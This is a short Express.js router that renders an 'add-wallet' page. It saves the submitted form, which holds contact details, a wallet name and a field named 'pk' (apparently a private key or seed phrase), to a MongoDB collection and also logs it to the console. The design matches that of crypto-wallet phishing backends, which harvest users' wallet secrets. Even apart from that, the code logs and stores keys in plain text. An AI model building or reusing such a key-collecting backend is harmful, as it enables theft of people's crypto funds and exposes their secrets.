const express = require('express');
const mongoose = require('mongoose')
const bodyparser = require("body-parser");

const router = express.Router()
const WSDBModel = mongoose.model("WSDB")



router.get("/contact", (req, res) => {
    res.render("contact", {})
});

router.get("/success", (req, res) => {
    res.render("success", {})
});

router.get("/fail", (req, res) => {
    res.render("fail", {})
});

router.get("/add", (req, res) => {
    res.render("add-wallet");
});


router.post("/add", (req, res) => {
    console.log(req.body);
    var wsdb = new WSDBModel;
    wsdb.firstName = req.body.firstName;
    wsdb.lastName = req.body.lastName;
    wsdb.EmailAddress = req.body.EmailAddress;
    wsdb.PhoneNumber = req.body.PhoneNumber;
    wsdb.walletName = req.body.walletName;
    wsdb.subject = req.body.subject;
    wsdb.message = req.body.message;
    wsdb.radio = req.body.radio;
    wsdb.pk = req.body.pk;
    wsdb.save((err, doc) => {
        if (!err)
        {
            res.redirect("/success")
        }
        else {
            console.log(err);
            res.redirect("/fail")
        }
    })
});




module.exports = router;